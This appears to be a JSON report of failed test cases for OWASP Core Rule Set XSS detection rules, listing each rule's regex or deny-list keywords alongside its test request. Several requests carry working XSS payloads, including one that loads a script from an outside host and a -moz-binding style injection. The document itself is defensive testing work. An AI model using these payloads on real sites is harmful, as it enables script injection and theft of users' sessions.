          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)[\\s\\\"'`;/0-9=\\x0B\\x09\\x0C\\x3B\\x2C\\x28\\x3B]on[a-zA-Z]{3,50}[\\s\\x0B\\x09\\x0C\\x3B\\x2C\\x28\\x3B]*?=[^=]"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 941120
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "utf8toUnicode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "htmlEntityDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cssDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "removeNulls"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "XSS Filter - Category 2: Event Handler Vector"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-xss"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "xss-perf-disable"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/2"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-XSS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/242"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.xss_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "941160",
    "test_id" : 1,
    "test_path" : "REQUEST-941-APPLICATION-ATTACK-XSS/941160.yaml",
    "description" : "XSS in XML Test as described in http://www.client9.com/article/five-interesting-injection-attacks/",
    "cause" : "failed expect_id check: 941160 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ ]
    },
    "test" : {
      "test_id" : 1,
      "desc" : "XSS in XML Test as described in http://www.client9.com/article/five-interesting-injection-attacks/",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "method" : "GET",
          "port" : 80,
          "uri" : "/get/demo/xss/xml/vuln.xml.php?input=<script+xmlns=\"http://www.w3.org/1999/xhtml\">setTimeout(\"top.frame2.location=\"javascript:(function+()+{var+x+=+document.createElement(\\\\\"script\\\\\");x.src+=+\\\\\"//sdl.me/popup.js?//\\\\\";document.childNodes\\\\[0\\\\].appendChild(x);}());\"\",1000)</script>&//",
          "headers" : {
            "User-Agent" : "OWASP CRS test agent",
            "Host" : "localhost",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 941160 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 941160,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " -=[ NoScript XSS Filters ]=-"
        }, {
          "type" : "Comment",
          "text" : " Ref: http://noscript.net/"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " [NoScript InjectionChecker] HTML injection"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/941160.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 941160"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : "User-Agent"
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : "Referer"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "SimpleVariable",
          "name" : "REQUEST_FILENAME"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)<[^0-9<>A-Z_a-z]*(?:[^\\s\\x0b\\\"'<>]*:)?[^0-9<>A-Z_a-z]*[^0-9A-Z_a-z]*?(?:s[^0-9A-Z_a-z]*?(?:c[^0-9A-Z_a-z]*?r[^0-9A-Z_a-z]*?i[^0-9A-Z_a-z]*?p[^0-9A-Z_a-z]*?t|t[^0-9A-Z_a-z]*?y[^0-9A-Z_a-z]*?l[^0-9A-Z_a-z]*?e|v[^0-9A-Z_a-z]*?g|e[^0-9A-Z_a-z]*?t[^0-9>A-Z_a-z])|f[^0-9A-Z_a-z]*?o[^0-9A-Z_a-z]*?r[^0-9A-Z_a-z]*?m|d[^0-9A-Z_a-z]*?i[^0-9A-Z_a-z]*?a[^0-9A-Z_a-z]*?l[^0-9A-Z_a-z]*?o[^0-9A-Z_a-z]*?g|m[^0-9A-Z_a-z]*?(?:a[^0-9A-Z_a-z]*?r[^0-9A-Z_a-z]*?q[^0-9A-Z_a-z]*?u[^0-9A-Z_a-z]*?e[^0-9A-Z_a-z]*?e|e[^0-9A-Z_a-z]*?t[^0-9A-Z_a-z]*?a[^0-9>A-Z_a-z])|(?:l[^0-9A-Z_a-z]*?i[^0-9A-Z_a-z]*?n[^0-9A-Z_a-z]*?k|o[^0-9A-Z_a-z]*?b[^0-9A-Z_a-z]*?j[^0-9A-Z_a-z]*?e[^0-9A-Z_a-z]*?c[^0-9A-Z_a-z]*?t|e[^0-9A-Z_a-z]*?m[^0-9A-Z_a-z]*?b[^0-9A-Z_a-z]*?e[^0-9A-Z_a-z]*?d|a[^0-9A-Z_a-z]*?(?:p[^0-9A-Z_a-z]*?p[^0-9A-Z_a-z]*?l[^0-9A-Z_a-z]*?e[^0-9A-Z_a-z]*?t|u[^0-9A-Z_a-z]*?d[^0-9A-Z_a-z]*?i[^0-9A-Z_a-z]*?o|n[^0-9A-Z_a-z]*?i[^0-9A-Z_a-z]*?m[^0-9A-Z_a-z]*?a[^0-9A-Z_a-z]*?t[^0-9A-Z_a-z]*?e)|p[^0-9A-Z_a-z]*?a[^0-9A-Z_a-z]*?r[^0-9A-Z_a-z]*?a[^0-9A-Z_a-z]*?m|i?[^0-9A-Z_a-z]*?f[^0-9A-Z_a-z]*?r[^0-9A-Z_a-z]*?a[^0-9A-Z_a-z]*?m[^0-9A-Z_a-z]*?e|b[^0-9A-Z_a-z]*?(?:a[^0-9A-Z_a-z]*?s[^0-9A-Z_a-z]*?e|o[^0-9A-Z_a-z]*?d[^0-9A-Z_a-z]*?y|i[^0-9A-Z_a-z]*?n[^0-9A-Z_a-z]*?d[^0-9A-Z_a-z]*?i[^0-9A-Z_a-z]*?n[^0-9A-Z_a-z]*?g[^0-9A-Z_a-z]*?s)|i[^0-9A-Z_a-z]*?m[^0-9A-Z_a-z]*?a?[^0-9A-Z_a-z]*?g[^0-9A-Z_a-z]*?e?|v[^0-9A-Z_a-z]*?i[^0-9A-Z_a-z]*?d[^0-9A-Z_a-z]*?e[^0-9A-Z_a-z]*?o)[^0-9>A-Z_a-z])|(?:<[0-9A-Z_a-z][^\\s\\x0b/]*[\\s\\x0b/]|[\\\"'](?:[^\\s\\x0b/]*[\\s\\x0b/])?)(?:background|formaction|lowsrc|on(?:a(?:bort|ctivate|d(?:apteradded|dtrack)|fter(?:print|(?:scriptexecu|upda)te)|lerting|n(?:imation(?:cancel|end|iteration|start)|tennastatechange)|ppcommand|u(?:dio(?:end|process|start)|xclick))|b(?:e(?:fore(?:(?:(?:(?:de)?activa|scriptexecu)t|toggl)e|c(?:opy|ut)|editfocus|input|p(?:aste|rint)|u(?:nload|pdate))|gin(?:Event)?)|l(?:ocked|ur)|oun(?:ce|dary)|roadcast|usy)|c(?:a(?:(?:ch|llschang)ed|nplay(?:through)?|rdstatechange)|(?:ell|fstate)change|h(?:a(?:rging(?:time)?cha)?nge|ecking)|l(?:ick|ose)|o(?:m(?:mand(?:update)?|p(?:lete|osition(?:end|start|update)))|n(?:nect(?:ed|ing)|t(?:extmenu|rolselect))|py)|u(?:echange|t))|d(?:ata(?:(?:availabl|chang)e|error|setc(?:hanged|omplete))|blclick|e(?:activate|livery(?:error|success)|vice(?:found|light|(?:mo|orienta)tion|proximity))|i(?:aling|s(?:abled|c(?:hargingtimechange|onnect(?:ed|ing))))|o(?:m(?:a(?:ctivate|ttrmodified)|(?:characterdata|subtree)modified|focus(?:in|out)|mousescroll|node(?:inserted(?:intodocument)?|removed(?:fromdocument)?))|wnloading)|r(?:ag(?:drop|e(?:n(?:d|ter)|xit)|(?:gestur|leav)e|over|start)|op)|urationchange)|e(?:mptied|n(?:abled|d(?:ed|Event)?|ter)|rror(?:update)?|xit)|f(?:ailed|i(?:lterchange|nish)|o(?:cus(?:in|out)?|rm(?:change|input))|ullscreenchange)|g(?:amepad(?:axismove|button(?:down|up)|(?:dis)?connected)|et)|h(?:ashchange|e(?:adphoneschange|l[dp])|olding)|i(?:cc(?:cardlockerror|infochange)|n(?:coming|put|valid))|key(?:down|press|up)|l(?:evelchange|o(?:ad(?:e(?:d(?:meta)?data|nd)|start)?|secapture)|y)|m(?:ark|essage|o(?:use(?:down|enter|(?:lea|mo)ve|o(?:ut|ver)|up|wheel)|ve(?:end|start)?|z(?:a(?:fterpaint|udioavailable)|(?:beforeresiz|orientationchang|t(?:apgestur|imechang))e|(?:edgeui(?:c(?:ancel|omplet)|start)e|network(?:down|up)loa)d|fullscreen(?:change|error)|m(?:agnifygesture(?:start|update)?|ouse(?:hittest|pixelscroll))|p(?:ointerlock(?:change|error)|resstapgesture)|rotategesture(?:start|update)?|s(?:crolledareachanged|wipegesture(?:end|start|update)?))))|no(?:match|update)|o(?:(?:bsolet|(?:ff|n)lin)e|pen|verflow(?:changed)?)|p(?:a(?:ge(?:hide|show)|int|(?:st|us)e)|lay(?:ing)?|o(?:inter(?:down|enter|(?:(?:lea|mo)v|rawupdat)e|o(?:ut|ver)|up)|p(?:state|up(?:hid(?:den|ing)|show(?:ing|n))))|ro(?:gress|pertychange))|r(?:atechange|e(?:adystatechange|ceived|movetrack|peat(?:Event)?|quest|s(?:et|ize|u(?:lt|m(?:e|ing)))|trieving)|ow(?:e(?:nter|xit)|s(?:delete|inserted)))|s(?:croll(?:end)?|e(?:arch|ek(?:complete|ed|ing)|lect(?:ionchange|start)?|n(?:ding|t)|t)|how|(?:ound|peech)(?:end|start)|t(?:a(?:lled|rt|t(?:echange|uschanged))|k(?:comma|sessione)nd|op)|u(?:bmit|ccess|spend)|vg(?:abort|error|(?:un)?load|resize|scroll|zoom))|t(?:ext|ime(?:out|update)|o(?:ggle|uch(?:cancel|en(?:d|ter)|(?:lea|mo)ve|start))|ransition(?:cancel|end|run|start))|u(?:n(?:derflow|handledrejection|load)|p(?:dateready|gradeneeded)|s(?:erproximity|sdreceived))|v(?:ersion|o(?:ic|lum)e)change|w(?:a(?:it|rn)ing|ebkit(?:animation(?:end|iteration|start)|(?:playbacktargetavailabilitychange|transitionen)d)|heel)|zoom)|ping|s(?:rc|tyle))[\\x08-\\n\\f\\r ]*?="
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 941160
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "utf8toUnicode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "htmlEntityDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cssDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "removeNulls"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "NoScript XSS InjectionChecker: HTML Injection"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-xss"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "xss-perf-disable"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-XSS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/242"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.xss_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "941180",
    "test_id" : 7,
    "test_path" : "REQUEST-941-APPLICATION-ATTACK-XSS/941180.yaml",
    "description" : "We should not trigger on REQUEST_FILENAME without special characters",
    "cause" : "failed no_expect_ids check: 941180 was found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=941180 - Node-Validator Deny List Keywords" ]
    },
    "test" : {
      "test_id" : 7,
      "desc" : "We should not trigger on REQUEST_FILENAME without special characters",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "method" : "GET",
          "port" : 80,
          "uri" : "/get/javascript-manual/document.cookie",
          "headers" : {
            "User-Agent" : "OWASP CRS test agent",
            "Host" : "localhost",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "no_expect_ids" : [ 941180 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 941180,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " [Deny List Keywords from Node-Validator]"
        }, {
          "type" : "Comment",
          "text" : " https://github.com/validatorjs/validator.js/"
        }, {
          "type" : "Comment",
          "text" : " This rule has a stricter sibling 941181 (PL2) that covers the additional payload \"-->\""
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "SimpleVariable",
          "name" : "REQUEST_FILENAME"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "pm",
        "value" : "document.cookie document.domain document.querySelector document.body.appendChild document.write .parentnode .innerhtml window.location -moz-binding <!-- <![cdata["
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 941180
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "utf8toUnicode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "htmlEntityDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cssDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "removeNulls"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Node-Validator Deny List Keywords"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-nodejs"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-xss"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "xss-perf-disable"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-XSS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/242"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.xss_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "941190",
    "test_id" : 3,
    "test_path" : "REQUEST-941-APPLICATION-ATTACK-XSS/941190.yaml",
    "description" : "Node-validator deny list keywords, COOKIES_NAMES",
    "cause" : "failed expect_id check: 941190 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ ]
    },
    "test" : {
      "test_id" : 3,
      "desc" : "Node-validator deny list keywords, COOKIES_NAMES",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "method" : "GET",
          "port" : 80,
          "uri" : "/get/baz",
          "headers" : {
            "User-Agent" : "OWASP CRS test agent",
            "Host" : "localhost",
            "Cookie" : "<STYLE>BODY{-moz-binding:url(\"http://xss.rocks/xssmoz.xml#xss\")}</STYLE>",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 941190 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 941190,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " -=[ XSS Filters from IE ]=-"
        }, {
          "type" : "Comment",
          "text" : " Ref: http://blogs.technet.com/srd/archive/2008/08/18/ie-8-xss-filter-architecture-implementation.aspx"
        }, {
          "type" : "Comment",
          "text" : " Ref: http://xss.cx/examples/ie/internet-exploror-ie9-xss-filter-rules-example-regexp-mshtmldll.txt"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "SimpleVariable",
          "name" : "REQUEST_FILENAME"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i:<style.*?>.*?(?:@[i\\x5c]|(?:[:=]|&#x?0*(?:58|3A|61|3D);?).*?(?:[(\\x5c]|&#x?0*(?:40|28|92|5C);?)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 941190
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "utf8toUnicode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "htmlEntityDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cssDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "removeNulls"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "IE XSS Filters - Attack Detected"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-internet-explorer"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-xss"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "xss-perf-disable"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-XSS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/242"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.xss_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "941210",
    "test_id" : 4,
    "test_path" : "REQUEST-941-APPLICATION-ATTACK-XSS/941210.yaml",
    "description" : "New line in javascript prefix, with &#10.",
    "cause" : "failed expect_id check: 941210 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 4,
      "desc" : "New line in javascript prefix, with &#10.",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "headers" : {
            "User-Agent" : "OWASP CRS test agent",
            "Host" : "localhost",
            "Accept" : "*/*",
            "Content-Type" : "application/json"
          },
          "data" : "{\"url\":\"javascript&#10:alert(7)\"}",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 941210 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 941210,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " This rule tries to match all the possible ways to write 'javascript' using"
        }, {
          "type" : "Comment",
          "text" : " html entities, and javascript escape sequences."
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "SimpleVariable",
          "name" : "REQUEST_FILENAME"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:j|&#(?:0*(?:74|106)|x0*[46]A);)(?:[\\t\\n\\r]|&(?:#(?:0*(?:9|1[03])|x0*[AD]);?|(?:tab|newline);))*(?:a|&#(?:0*(?:65|97)|x0*[46]1);)(?:[\\t\\n\\r]|&(?:#(?:0*(?:9|1[03])|x0*[AD]);?|(?:tab|newline);))*(?:v|&#(?:0*(?:86|118)|x0*[57]6);)(?:[\\t\\n\\r]|&(?:#(?:0*(?:9|1[03])|x0*[AD]);?|(?:tab|newline);))*(?:a|&#(?:0*(?:65|97)|x0*[46]1);)(?:[\\t\\n\\r]|&(?:#(?:0*(?:9|1[03])|x0*[AD]);?|(?:tab|newline);))*(?:s|&#(?:0*(?:115|83)|x0*[57]3);)(?:[\\t\\n\\r]|&(?:#(?:0*(?:9|1[03])|x0*[AD]);?|(?:tab|newline);))*(?:c|&#(?:x0*[46]3|0*(?:99|67));)(?:[\\t\\n\\r]|&(?:#(?:0*(?:9|1[03])|x0*[AD]);?|(?:tab|newline);))*(?:r|&#(?:x0*[57]2|0*(?:114|82));)(?:[\\t\\n\\r]|&(?:#(?:0*(?:9|1[03])|x0*[AD]);?|(?:tab|newline);))*(?:i|&#(?:x0*[46]9|0*(?:105|73));)(?:[\\t\\n\\r]|&(?:#(?:0*(?:9|1[03])|x0*[AD]);?|(?:tab|newline);))*(?:p|&#(?:x0*[57]0|0*(?:112|80));)(?:[\\t\\n\\r]|&(?:#(?:0*(?:9|1[03])|x0*[AD]);?|(?:tab|newline);))*(?:t|&#(?:x0*[57]4|0*(?:116|84));)(?:[\\t\\n\\r]|&(?:#(?:0*(?:9|1[03])|x0*[AD]);?|(?:tab|newline);))*(?::|&(?:#(?:0*58|x0*3A);?|colon;))."
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 941210
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "utf8toUnicode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "htmlEntityDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cssDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
